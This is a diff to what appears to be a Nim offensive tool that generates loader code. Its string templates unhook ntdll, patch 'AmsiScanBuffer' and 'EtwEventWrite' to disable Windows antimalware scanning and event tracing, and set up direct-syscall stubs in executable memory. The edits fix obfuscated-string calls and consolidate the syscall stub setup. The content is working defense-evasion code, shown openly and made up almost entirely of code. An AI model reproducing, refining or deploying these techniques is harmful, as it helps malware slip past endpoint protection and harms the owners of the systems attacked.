@@ -201,15 +201,15 @@ proc ntdllunhook(): bool =
           var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
           status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
           if status != 0:
-            echo obf"[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
+            echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
             return false
           status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
           if status != 0:
-            echo obf"[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{GetLastError()}."
+            echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{GetLastError()}."
             return false
           status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
           if status != 0:
-            echo obf"[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
+            echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
             return false  
   status = NtClose(processH)
   status = NtClose(ntdllFile)
@@ -225,12 +225,6 @@ when isMainModule:
 
 """
 
-let AMSIETWDelegates * = """
-# Unmanaged NTDLL Declarations
-type myNtProtectVM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
-type myNtWriteVM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-
-"""
 
 let AMSIStub * = """
 proc PatchAmsi(): bool =
@@ -257,30 +251,17 @@ proc PatchAmsi(): bool =
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
     
-    var hProcess: HANDLE
-    hProcess = GetCurrentProcess()
-
-    let tProcess2 = GetCurrentProcessId()
-    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-    var syscallStub_NtProtect: LPVOID
-    syscallStub_NtProtect = VirtualAllocEx(
-        pHandle2,
-        NULL,
-        cast[SIZE_T](SYSCALL_STUB_SIZE),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READ_WRITE
-    )
 
     var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
 
     var oldProtection: DWORD = 0
 
     # Define NtProtectVirtualMemory
-    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
+    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
     VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     # define NtWriteVirtualMemory
-    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
+    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
     VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     var success: BOOL
@@ -349,30 +330,17 @@ proc Patchntdll(): bool =
         echo obf("[X] Failed to get the address of 'EtwEventWrite'")
         return disabled
 
-    var hProcess: HANDLE
-    hProcess = GetCurrentProcess()
-
-    let tProcess2 = GetCurrentProcessId()
-    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-    var syscallStub_NtProtect: LPVOID
-    syscallStub_NtProtect = VirtualAllocEx(
-        pHandle2,
-        NULL,
-        cast[SIZE_T](SYSCALL_STUB_SIZE),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READ_WRITE
-    )
 
     var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
 
     var oldProtection: DWORD = 0
 
     # Define NtProtectVirtualMemory
-    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
+    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
     VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     # define NtWriteVirtualMemory
-    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
+    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
     VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     var success: BOOL
@@ -965,31 +933,6 @@ when isMainModule:
 
 
 let ProtectWriteAllocSyscalls * = """
-
-
-# Unmanaged NTDLL Declarations
-type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
-type myNtWriteVirtM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-
-var 
-  NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
-  NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-  NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-
-var hProcess: HANDLE
-hProcess = GetCurrentProcess()
-    
-let tProcess2 = GetCurrentProcessId()
-var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-var syscallStub_NtProtect: LPVOID
-syscallStub_NtProtect = VirtualAllocEx(
-    pHandle2,
-    NULL,
-    cast[SIZE_T](SYSCALL_STUB_SIZE),
-    MEM_COMMIT,
-    PAGE_EXECUTE_READ_WRITE
-)
 
 proc GetStubs(): void =
 
